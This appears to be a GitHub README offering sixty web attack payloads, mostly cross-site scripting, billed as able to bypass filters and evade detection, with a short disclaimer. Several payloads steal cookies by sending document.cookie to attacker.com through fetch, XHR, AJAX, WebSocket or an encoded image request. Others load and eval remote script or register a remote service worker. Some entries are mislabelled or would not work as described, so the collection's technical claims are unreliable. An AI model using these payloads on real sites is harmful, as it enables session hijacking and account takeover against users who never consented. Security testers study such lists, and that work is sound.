# 🎯 Advanced Payloads Collection

Welcome to the Advanced Payloads Collection! This repo features a variety of advanced payloads crafted for testing vulnerabilities in web apps, APIs, and servers. Each payload is designed to bypass security filters and evade detection. **For educational and ethical testing purposes only!**

## ⚠️ Disclaimer

**Use these payloads responsibly! Unauthorized testing on systems you don't own or have permission to test is illegal and unethical.**

---

### 📦 Payload Collection

1. **Obfuscation Techniques:**
   ```plaintext
   <script>eval(String.fromCharCode(97, 108, 101, 114, 116))</script>
   ```

2. **Header-based Attacks:**
   ```plaintext
   Referer: <script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
   ```

3. **JavaScript Obfuscation (XSS):**
   ```plaintext
   <script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>
   ```

4. **Base64 Encoded Payload:**
   ```plaintext
   <script>eval(atob('YWxlcnQoIkhBQ0tFRCIp'))</script>
   ```

5. **Time-based Payload (Delayed Execution):**
   ```plaintext
   <script>setTimeout(function(){alert('XSS');}, 5000);</script>
   ```

6. **HTML Entity Encoding (Bypass Filters):**
   ```plaintext
   <svg/onload=alert&#40;'XSS'&#41;>
   ```

7. **Polyglot Payload (MIME Confusion):**
   ```plaintext
   <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUA...">
   <script>alert('XSS')</script>
   ```

8. **HTTP Parameter Pollution:**
   ```plaintext
   GET /search?term=<script>alert(1)</script>&term=<b>safe</b>
   ```

9. **CSP Bypass Using Nonce:**
   ```plaintext
   <script nonce="random123">alert('XSS');</script>
   ```

10. **SVG-based XSS:**
    ```plaintext
    <svg><script>alert(1)</script></svg>
    ```

11. **Comment Injection:**
    ```plaintext
    <!-- <script>alert('XSS')</script> -->
    ```

12. **DOM-based XSS:**
    ```plaintext
    <script>location.hash='javascript:alert(1)';</script>
    ```

13. **Iframe Injection:**
    ```plaintext
    <iframe src="javascript:alert(1)"></iframe>
    ```

14. **CSS Injection:**
    ```plaintext
    <style>@import'http://attacker.com/steal.css';</style>
    ```

15. **Malformed URL Injection:**
    ```plaintext
    <img src="http://example.com/invalid.jpg" onerror="alert('XSS')">
    ```

16. **XHR Payload:**
    ```plaintext
    <script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://attacker.com/steal?cookie=' + document.cookie);
    xhr.send();
    </script>
    ```

17. **XML Injection:**
    ```plaintext
    <data>
      <user><name><![CDATA[<script>alert(1)</script>]]></name></user>
    </data>
    ```

18. **JavaScript URL:**
    ```plaintext
    <a href="javascript:alert('XSS')">Click here</a>
    ```

19. **WebSocket Exploit:**
    ```plaintext
    <script>
    var ws = new WebSocket('ws://attacker.com/socket');
    ws.onopen = function() { ws.send(document.cookie); };
    </script>
    ```

20. **Data URI Payload:**
    ```plaintext
    <img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
    ```

21. **JavaScript Injection through URL Parameters:**
    ```plaintext
    http://example.com/page?param=<script>alert(1)</script>
    ```

22. **Base64 in Script Tags:**
    ```plaintext
    <script src="data:text/javascript;base64,YWxlcnQoJ1hTUycp"></script>
    ```

23. **Multi-encoded Payload:**
    ```plaintext
    <script>eval(decodeURIComponent('%3Cimg%20src%3D%22http%3A%2F%2Fattacker.com%2Fimg%3Fcookie%3D%22%20%2B%20document.cookie%29%3E'));</script>
    ```

24. **JSON Hijacking:**
    ```plaintext
    <script>fetch('/api/user').then(res => res.json()).then(data => alert(data.user));</script>
    ```

25. **AJAX Payload:**
    ```plaintext
    <script>
    $.ajax({url: "http://attacker.com/steal?cookie=" + document.cookie});
    </script>
    ```

26. **Stored XSS (Input Field):**
    ```plaintext
    <input type="text" value="<script>alert('XSS')</script>">
    ```

27. **Method Override:**
    ```plaintext
    POST /api/v1/resource HTTP/1.1
    X-HTTP-Method-Override: DELETE
    ```

28. **Cookie Bypass with SameSite:**
    ```plaintext
    Set-Cookie: sessionId=abc123; SameSite=None; Secure
    ```

29. **Manipulating Session Cookies:**
    ```plaintext
    <script>document.cookie='sessionId=malicious';</script>
    ```

30. **Cross-Site Script Inclusion:**
    ```plaintext
    <script src="http://attacker.com/malicious.js"></script>
    ```

31. **XHR with CORS Bypass:**
    ```plaintext
    <script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://cors.bypass.com/api', true);
    xhr.send();
    </script>
    ```

32. **Local Storage XSS:**
    ```plaintext
    <script>localStorage.setItem('user', '<script>alert(1)</script>');</script>
    ```

33. **Document Domain Manipulation:**
    ```plaintext
    <script>document.domain='malicious.com';</script>
    ```

34. **Mouseover Event Trigger:**
    ```plaintext
    <img src="#" onmouseover="alert('XSS')">
    ```

35. **Onerror Event Handler:**
    ```plaintext
    <img src="invalid.jpg" onerror="alert('XSS')">
    ```

36. **Resource Loading via JSONP:**
    ```plaintext
    <script src="http://example.com/api?callback=alert(1)"></script>
    ```

37. **Inlined JavaScript in HTML:**
    ```plaintext
    <div style="background:url('javascript:alert(1)')"></div>
    ```

38. **Clickjacking via Iframe:**
    ```plaintext
    <iframe src="http://example.com"></iframe>
    ```

39. **Custom Protocol Handler:**
    ```plaintext
    <a href="customprotocol:alert('XSS')">Click me</a>
    ```

40. **Meta Refresh Injection:**
    ```plaintext
    <meta http-equiv="refresh" content="0;url=http://attacker.com/steal">
    ```

41. **SVG Filter for XSS:**
    ```plaintext
    <svg><filter id="f"><feFlood flood-color="red" /></filter><rect width="100" height="100" filter="url(#f)"/></svg>
    ```

42. **Accessing Global Variables:**
    ```plaintext
    <script>window.onload = function() { alert(window.someGlobalVar); };</script>
    ```

43. **Using the onload Event:**
    ```plaintext
    <body onload="alert('XSS')"></body>
    ```

44. **Multiple Nested Payloads:**
    ```plaintext
    <script><script>alert('XSS');</script></script>
    ```

45. **Manipulating the Location Object:**
    ```plaintext
    <script>window.location='http://attacker.com'</script>
    ```

46. **Service Worker Injection:**
    ```plaintext
    <script>
    if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('http://attacker.com/sw.js');
    }
    </script>
    ```

47. **WebSocket Message Injection:**
    ```plaintext
    <script>
    var ws = new WebSocket('ws://attacker.com/socket');
    ws.onmessage = function(event) { alert(event.data); };
    </script>
    ```

48. **Hash-based Payload:**
    ```plaintext
    <script>
    var hash = '#<script>alert(1)</script>';
    location.href = hash;
    </script>
    ```

49. **HTML5 Web Workers:**
    ```plaintext
    <script>
    var worker = new Worker('http://attacker.com/worker.js');
    </script>
    ```

50. **Dynamic Script Injection:**
    ```plaintext
    <script>
    var script = document.createElement('script');
    script.src = 'http://attacker.com/malicious.js';
    document.head.appendChild(script);
    </script>
    ```

51. **SetInterval Payload:**
    ```plaintext
    <script>setInterval(function(){alert('XSS');}, 1000);</script>
    ```

52. **Object Injection:**
    ```plaintext
    <script>var obj = {}; obj.__proto__.alert = function() { alert('XSS'); };</script>
    ```

53. **Prototype Pollution:**
    ```plaintext
    <script>Object.prototype.polluted = true;</script>
    ```

54. **Using the eval Function:**
    ```plaintext
    <script>eval('alert(1)');</script>
    ```

55. **Script Loading via XHR:**
    ```plaintext
    <script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://attacker.com/script.js', true);
    xhr.onload = function() { eval(xhr.responseText); };
    xhr.send();
    </script>
    ```

56. **Fetch with CORS:**
    ```plaintext
    <script>
    fetch('http://attacker.com/cookie?value=' + document.cookie);
    </script>
    ```

57. **Inline Event Handlers:**
    ```plaintext
    <button onclick="alert('XSS')">Click Me</button>
    ```

58. **Inline Script Execution via Event Attributes:**
    ```plaintext
    <div onmouseover="alert('XSS')">Hover over me!</div>
    ```

59. **Using setImmediate for Delayed Execution:**
    ```plaintext
    <script>setImmediate(() => alert('XSS'));</script>
    ```

60. **Using requestAnimationFrame for Timing Control:**
    ```plaintext
    <script>requestAnimationFrame(() => alert('XSS'));</script>
    ```

---

## 📜 Acknowledgments

This payload collection is inspired by the need for robust security testing methodologies. Each payload is crafted for penetration testing professionals and should only be used in ethical contexts.

## 💬 Contact

For questions or contributions, feel free to reach out at **ashishkumarjha1999@gmail.com**!

